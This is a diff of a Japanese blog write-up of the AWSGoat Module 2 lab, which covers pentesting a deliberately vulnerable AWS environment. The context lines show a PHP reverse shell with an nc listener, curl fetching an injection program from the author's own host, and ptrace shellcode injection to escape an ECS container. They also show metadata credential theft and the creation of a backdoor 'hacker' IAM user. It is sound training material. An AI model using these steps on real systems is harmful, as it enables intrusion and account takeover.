@@ -1,16 +1,18 @@
-<span style="color: #ff0000"> **⚠️ AWSGoat Module-2 のネタバレあり** </span>
+<span style="color: #ff0000"> **⚠️ AWSGoat Module 2 のネタバレあり** </span>
 
 <div style="text-align:center;">
-[f:id:motikan2010:20230531111418p:plain:w600]
+[f:id:motikan2010:20230601152838p:plain:w600]
 </div>
 
 <div class="contents-box"><p>[:contents]</p></div>
 
 ## はじめに
 
-<span style="color: #ff0000"> **⚠️ AWSGoat Module-2 のネタバレあり** </span>
+<span style="color: #ff0000"> **⚠️ AWSGoat Module 2 のネタバレあり** </span>
 
 　本記事では、AWS環境のやられアプリである「**AWSGoat**」を使って、AWS環境下でのペネトレーションテスト（ペンテスト）の学習してみたのでその紹介です。
+
+### AWSGost とは
 
 　AWSGost は教育コンテンツで有名な「**INE**」が提供しており、アプリケーションやインフラのコードは以下のリポジトリで公開されています。  
 
@@ -35,7 +37,7 @@
 　そのため「Webアプリケーション」に関しての説明は少なめになっています。  
 
 　また、公式の攻略手順も公開されているため、これを参考にするのも良いかと思います。  
-https://github.com/ine-labs/AWSGoat/tree/master/attack-manuals/module-2
+https://github.com/ine-labs/AWSGoat/tree/master/attack-manuals/module 2
 
 ### インフラの料金
 
@@ -43,8 +45,8 @@ https://github.com/ine-labs/AWSGoat/tree/master/attack-manuals/module-2
 
 　以下の料金の記載がありました。  
 
-- Module 1: $0.0125/hour  (1.75円 / 時)
-- Module 2: $0.0505/hour (7.07円 / 時)
+- Module 1: $0.0125 / hour  (1.75円 / 時)
+- Module 2: $0.0505 /hour (7.07円 / 時)
 
 ## ラボ環境の構築
 
@@ -57,7 +59,7 @@ AWSGost の環境構築は簡単です。
 
 <span style="color: #ff0000">脆弱なアプリケーションや脆弱なサービスの設定がデプロイされます。  </span>
 
-<span style="color: #ff0000">**検証環境のような最悪侵入されても問題ないAWSアカウントに構築してください。**</span>
+<span style="color: #ff0000">検証環境のような**最悪侵入されても問題ないAWSアカウント上**に構築してください。</span>
 
 #### AWSGost リポジトリをフォーク 
 
@@ -81,13 +83,13 @@ AWSGost の環境構築は簡単です。
 
 [f:id:motikan2010:20230531013814p:plain:w600]
 
-　出力結果にある「Application URL」がこのラボのスタート地点となるWebアプリケーションです。  
+　出力結果にある「Application URL」にアクセスすると、このラボのスタート地点となるWebアプリケーションが表示されます。  
 
 [f:id:motikan2010:20230531004100p:plain:w600]
 
-## Module-2の大体の流れ
+## Module 2の大体の流れ
 
-　Module-2 は大きく分けて４つのStepが存在しています。  
+　Module 2 は大きく分けて４つのStepが存在しています。  
 
 <span style="color: #ff0000">本記事では「Step 3」と「Step 4」に重点を置いて説明をしていきます。</span>
 
@@ -103,13 +105,13 @@ AWSGost の環境構築は簡単です。
 **Step 3. ECS Breakout and Instance Metadata**
 
 1. vimを活用した権限昇格（コンテナ内でroot権限を取得）
-1. ホスト上にあるプロセスに対してのプロセスインジェクションを実施して**コンテナからの脱獄**  
+1. ホストマシン上のプロセスに対してプロセスインジェクションを実施して**コンテナからの脱獄**  
 （ホストマシンのroot権限を取得）
-1. ホストマシンの一時クレデンシャルを取得
+1. ホストマシンのメタデータサービスにアクセスし一時クレデンシャルを取得
 
 **Step 4. IAM Privilege Escalation**
 
-1. 強い権限のポリシー・ロールを探索
+1. 強い権限のポリシー・ロールを探索　（「Step 3」で取得したクレデンシャルを利用）
 1. 強い権限をもったEC2インスタンスを作成 & インスタンスから一時クレデンシャルを取得
 1. 管理者権限（AdministratorAccess）を持った「バックドアAWSユーザ」を追加（<span style="color: #ff0000">最終目標</span>）
 
@@ -117,7 +119,7 @@ AWSGost の環境構築は簡単です。
 
 　環境構築時に出力されるURLにアクセスすると下画像のようなログイン画面が表示されます。  
 
-　このパートではログインを成功させることが目的となっています。  
+　このパートではダッシュボードへログインを成功させることが目的となっています。  
 
 [f:id:motikan2010:20230531004114p:plain:w600]
 
@@ -159,7 +161,7 @@ AWSGost の環境構築は簡単です。
 [https://github.com/pentestmonkey/php-reverse-shell:title]
 
 
-　50行目付近に接続を待ち受けるマシンのIPアドレスとポート番号を設定する箇所がありますので、そこにAWS環境からアクセスできるマシンの情報を記述します。  
+　50行目付近に接続を待ち受けるマシンのIPアドレスとポート番号を設定する箇所がありますので、そこに**AWS環境からアクセスできる**マシンの情報を記述します。  
 
 <div class="md-code" style="width:100%">
 
@@ -172,7 +174,7 @@ $port = 1234;       // CHANGE THIS
 
 #### 待ち受け側
 
-　接続を待ち受けるマシン上で「nc -nlvp 4443」コマンドを実行します。  
+　接続を待ち受けるマシン上で「`nc -nlvp 4443`」コマンドを実行します。（4443 は待ち受けのポート番号）   
 
 <div class="md-code" style="width:100%">
 
@@ -404,11 +406,21 @@ Guessed mode: UNCERTAIN (0)
 
 </div>
 
-　ここで重要なのは**コンテナ内でのみroot権限を取得した**ということです。
+　ここで重要なのは**コンテナ内でのみroot権限**を取得したということです。まだメタデータサービスにアクセスできない等、制限は設けられています。
 
-　まだメタデータサービスにアクセスできない等、制限は設けられています。
+　<span style="color: #ff0000">しかし、Dockerがデフォルトでは保持しないケイパビリティ「`SYS_PTRACE`」をこのコンテナは保持していることが分かりました。</span>
 
-### コンテナから脱獄（Jailbreak）
+[f:id:motikan2010:20230601163435p:plain:w600]  
+<span><a href="https://docs.docker.jp/engine/reference/run.html#runtime-privilege-linux-capabilities" target="_blank">実行時の権限、Linuxケーパビリティ | Docker run リファレンス</a></span>
+
+　Q. 「SYS_PTRACE」とは？  
+　A. 任意のプロセスに `ptrace(2)` が使用できるようするケイパビリティ。  
+
+　Q. 「ptrace(2)」とは？  
+　A. 他のプロセスを制御することができるシステムコール。<span style="color: #ff0000">メモリの内容も書き換えることも可能</span>。  
+
+
+### コンテナから脱獄（Jailbreak / Breakout）
 
 　コンテナから脱獄してホストマシン上でroot権限のシェルを取得していきます。
 
@@ -423,7 +435,7 @@ Guessed mode: UNCERTAIN (0)
 [f:id:motikan2010:20230531152707p:plain:w500]
 
 　ちなみにこの設定はAWS Coinfig で警告される非推奨な設定です。  
-<span><a href="https://docs.aws.amazon.com/ja_jp/config/latest/developerguide/ecs-task-definition-pid-mode-check.html" target="_blank">ecs-task-definition-pid-mode-check - AWS Config</a></span>
+AWS Config ルール：<span><a href="https://docs.aws.amazon.com/ja_jp/config/latest/developerguide/ecs-task-definition-pid-mode-check.html" target="_blank">ecs-task-definition-pid-mode-check - AWS Config</a></span>
 
 　また、コンテナ環境の<span style="color: #ff0000">**ケイパビリティに「SYS_PTRACE」が追加されてる**</span>ため任意のプロセスを操作することできます。  
 下画像はECS タスク定義のケイパビリティの設定部分です。  「`SYS_PTRACE`」が追加されています。
@@ -486,8 +498,9 @@ Linux 533e4e3fac01 4.14.313-235.533.amzn2.x86_64 #1 SMP Tue Apr 25 15:24:19 UTC 
 
 [https://0x00sec.org/t/linux-infecting-running-processes/1097:title]
 
+<br>
 
-　インジェクションするシェルコードは以下のコード参考にします。  
+　プロセスにインジェクションするシェルコードは以下のコードを拝借します。  
 
 [https://www.exploit-db.com/exploits/41128:embed:cite]
 
@@ -499,9 +512,10 @@ Linux 533e4e3fac01 4.14.313-235.533.amzn2.x86_64 #1 SMP Tue Apr 25 15:24:19 UTC 
 
 </div>
 
-　インジェクションするシェルコードを反映したC言語プログラムは以下のようになります。  
+　シェルコードを反映したC言語プログラムは以下のようになります。  
+「`unsigned char *shellcod =`」と「`#define SHELLCODE_SIZE 32`」の行を書き換えています。  
 
-　これを「`inject.c`」というファイル名で保存します。
+　このファイルを「`inject.c`」という名前で保存します。
 
 <div class="md-code" style="width:100%">
 
@@ -609,7 +623,7 @@ root@533e4e3fac01:/# curl http://164.xxx.yyy.xxx/inject.c -o inject.c
 </div>
 
 <br>
-　プログラムを標的マシン上に配置できたらコンパイルを実施します。  
+　プログラムを標的マシン上に配置できたらコンパイルをします。  
 
 <div class="md-code" style="width:100%">
 
@@ -654,6 +668,7 @@ root@533e4e3fac01:/# ./inject 19477
 
 <br>
 　コンテナ内でネットワーク情報の取得し、ホストマシンのIPアドレスを推測します。  
+コンテナ環境のIPアドレスが 172.17.0.2 ですので、ホストマシン側のIPアドレスは 172.17.0.1 だと推測できます。  
 
 <div class="md-code" style="width:100%">
 
@@ -1109,7 +1124,7 @@ $ aws iam list-roles
 </div>
 
 　興味深いロール「`ec2Deployer-role`」を見つけることができました。  
-（※ この結果だけでは強いロールかどうかを判断することはできません。実際の現場などでは一通りアタッチされらポリシーの権限を確認することになると思います。）  
+（※ この結果だけでは強いロールかどうかを判断することはできません。実際の現場などでは一通りアタッチされたポリシーの権限を確認することになると思います。）  
 
 <div class="md-code" style="width:100%">
 
@@ -1756,3 +1771,7 @@ $ aws iam create-access-key --user-name hacker
 1.  EC2の「`i-0f7f96d4e98xxxxx`」を削除
 2.  IAMユーザの「`hacker`」を削除
 3. GitHub Actionで「Terraform Destroy」を実行
+
+[blog:g:12921228815726579926:banner]
+
+
